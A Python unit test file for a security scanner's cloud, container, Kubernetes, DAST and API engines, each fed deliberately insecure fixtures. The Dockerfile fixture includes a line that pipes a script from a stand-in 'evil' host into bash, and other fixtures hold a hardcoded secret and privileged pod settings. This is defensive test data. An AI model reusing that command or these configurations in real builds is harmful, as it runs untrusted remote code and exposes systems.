"""Unit tests for the Phase 4 infrastructure engines (offline, snapshot-driven)."""

import json

from guardian_core.enums import EngineKey, Severity
from guardian_scanner.engines.api_engine import ApiEngine
from guardian_scanner.engines.base import ScanContext
from guardian_scanner.engines.container_engine import ContainerEngine
from guardian_scanner.engines.cspm_engine import CspmEngine
from guardian_scanner.engines.dast_engine import DastEngine
from guardian_scanner.engines.k8s_engine import K8sEngine


def _ctx(kind, inline=None, asset_config=None, identifier="x"):
    return ScanContext(
        scan_id="t",
        asset_kind=kind,
        asset_identifier=identifier,
        inline_content=inline,
        asset_config=asset_config or {},
    )


# ── CSPM ──
CLOUD = {
    "provider": "aws",
    "storage": [{"name": "b1", "public": True, "encrypted": False}],
    "iam": {"users": [{"name": "svc", "mfa": False, "policies": ["*"]}]},
    "network": [{"name": "sg1", "ingress": [{"cidr": "0.0.0.0/0", "port": 22}]}],
    "logging": {"cloudtrail_enabled": False},
}


def test_cspm_flags_cloud_misconfigs():
    findings = list(CspmEngine().run(_ctx("cloud_account", inline=json.dumps(CLOUD))))
    titles = " ".join(f.title for f in findings)
    assert "Publicly accessible storage" in titles
    assert "Over-permissioned IAM" in titles
    assert "exposed to the internet" in titles
    assert "Unencrypted storage" in titles
    assert "Audit logging disabled" in titles
    assert all(f.engine == EngineKey.CSPM for f in findings)
    assert all("cis" in f.references for f in findings)


def test_cspm_requires_authorization():
    assert CspmEngine().requires_authorization is True


# ── Container / Dockerfile ──
DOCKERFILE = """
FROM python:latest
ENV API_KEY=supersecretvalue
RUN curl http://evil/install.sh | bash
COPY . /app
"""


def test_container_flags_dockerfile_issues():
    findings = list(ContainerEngine().run(_ctx("container_image", inline=DOCKERFILE)))
    titles = " ".join(f.title for f in findings)
    assert "runs as root" in titles  # no USER
    assert "latest" in titles
    assert "Secret baked into image" in titles
    assert "piped to shell" in titles


# ── Kubernetes ──
MANIFEST = """
apiVersion: v1
kind: Pod
metadata: {name: web}
spec:
  hostNetwork: true
  containers:
    - name: app
      image: nginx
      securityContext: {privileged: true}
"""


def test_k8s_flags_manifest_issues():
    findings = list(K8sEngine().run(_ctx("k8s_manifest", inline=MANIFEST)))
    titles = " ".join(f.title for f in findings)
    assert "Privileged container" in titles
    assert "host namespace" in titles
    assert any(f.base_severity == Severity.CRITICAL for f in findings)
    assert all(f.engine == EngineKey.K8S for f in findings)


# ── DAST ──
def test_dast_flags_headers_and_cookies():
    snap = {
        "http_snapshot": {
            "url": "https://app.example.com",
            "headers": {"Server": "nginx/1.0"},
            "cookies": [{"name": "session", "secure": False, "httponly": False, "samesite": None}],
        }
    }
    findings = list(DastEngine().run(_ctx("web", asset_config=snap)))
    titles = " ".join(f.title for f in findings)
    assert "HSTS" in titles
    assert "Content-Security-Policy" in titles
    assert "without Secure flag" in titles
    assert "without HttpOnly" in titles
    assert DastEngine().requires_authorization is True


# ── API ──
OPENAPI = {
    "openapi": "3.0.0",
    "servers": [{"url": "http://api.example.com"}],
    "paths": {"/users": {"get": {"responses": {"200": {}}}}},
}


def test_api_flags_spec_issues():
    findings = list(ApiEngine().run(_ctx("api", inline=json.dumps(OPENAPI))))
    titles = " ".join(f.title for f in findings)
    assert "no authentication scheme" in titles
    assert "Endpoint without authentication" in titles
    assert "plaintext HTTP" in titles
    assert "No rate limiting" in titles
